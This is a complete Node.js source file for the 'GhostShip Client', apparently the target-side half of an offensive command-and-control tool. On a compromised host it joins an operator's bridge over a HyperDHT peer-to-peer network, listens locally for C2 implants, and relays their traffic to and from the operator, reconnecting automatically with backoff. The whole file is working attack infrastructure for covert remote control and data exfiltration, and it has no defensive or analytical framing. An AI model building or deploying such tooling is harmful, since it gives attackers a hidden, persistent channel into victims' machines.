/*
 * GhostShip Client - P2P Tunnel Endpoint
 *
 * Connects to the operator's bridge via HyperDHT and opens a local
 * TCP port for C2 implants to connect to.
 *
 * Usage: node client.js --connect hs://<public-key-hex> [--port 8888]
 */

const net = require('net');
const HyperDHT = require('hyperdht');
const { program } = require('commander');

program
  .requiredOption('-c, --connect <key>', 'Connection key from bridge (hs://...)')
  .option('-p, --port <number>', 'Local port for implant to connect', '8888')
  .parse(process.argv);

const options = program.opts();

/* Validate connection key */
if (!options.connect.startsWith('hs://')) {
  console.error('[!] Invalid connection key. Must start with hs://');
  process.exit(1);
}

const publicKeyHex = options.connect.replace('hs://', '');
const publicKey = Buffer.from(publicKeyHex, 'hex');

if (publicKey.length !== 32) {
  console.error('[!] Invalid connection key length');
  process.exit(1);
}

const localPort = parseInt(options.port, 10);
const dht = new HyperDHT();

console.log('\x1b[1m\x1b[32m======================================================================\x1b[0m');
console.log('\x1b[1m\x1b[32m  GHOSTSHIP CLIENT (v1.0.0) - TARGET SIDE\x1b[0m');
console.log('\x1b[1m\x1b[32m======================================================================\x1b[0m');
console.log(`\x1b[1mBridge Key:\x1b[0m       ${options.connect.substring(0, 20)}...`);
console.log(`\x1b[1mLocal Port:\x1b[0m       ${localPort}`);
console.log('\x1b[1m\x1b[32m======================================================================\x1b[0m');

async function connectToBridge() {
  console.log('[*] Connecting to bridge via DHT...');

  try {
    const bridgeSocket = dht.connect(publicKey);

    bridgeSocket.on('open', () => {
      console.log('[+] P2P Connection to bridge established');
      console.log(`[*] Starting local listener on 127.0.0.1:${localPort}`);

      /* Create local TCP server for implant to connect */
      const server = net.createServer((implantSocket) => {
        console.log('[*] Implant connected to local port');

        /* Bidirectional piping */
        bridgeSocket.on('data', (data) => {
          if (!implantSocket.destroyed) {
            implantSocket.write(data);
          }
        });

        implantSocket.on('data', (data) => {
          if (!bridgeSocket.destroyed) {
            bridgeSocket.write(data);
          }
        });

        implantSocket.on('end', () => {
          console.log('[*] Implant disconnected');
        });

        implantSocket.on('error', (err) => {
          console.error('[!] Implant connection error:', err.message);
        });
      });

      server.listen(localPort, '127.0.0.1', () => {
        console.log(`[+] Listening on 127.0.0.1:${localPort}`);
        console.log('[*] Configure your implant to connect to this address');
      });

      server.on('error', (err) => {
        console.error('[!] Server error:', err.message);
        bridgeSocket.destroy();
      });
    });

    bridgeSocket.on('error', (err) => {
      console.error('[!] DHT connection error:', err.message);
      scheduleReconnect();
    });

    bridgeSocket.on('close', () => {
      console.log('[*] Bridge connection closed');
      scheduleReconnect();
    });

  } catch (err) {
    console.error('[!] Connection failed:', err.message);
    scheduleReconnect();
  }
}

/* Reconnection logic */
let reconnectAttempts = 0;
const MAX_RECONNECT_DELAY = 300000;

function scheduleReconnect() {
  reconnectAttempts++;
  const delay = Math.min(1000 * Math.pow(2, reconnectAttempts), MAX_RECONNECT_DELAY);
  console.log(`[*] Reconnecting in ${delay / 1000}s (attempt ${reconnectAttempts})`);
  setTimeout(connectToBridge, delay);
}

/* Handle signals */
process.on('SIGTERM', () => {
  console.log('[*] Shutting down...');
  dht.destroy();
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('[*] Shutting down...');
  dht.destroy();
  process.exit(0);
});

/* Start */
connectToBridge();
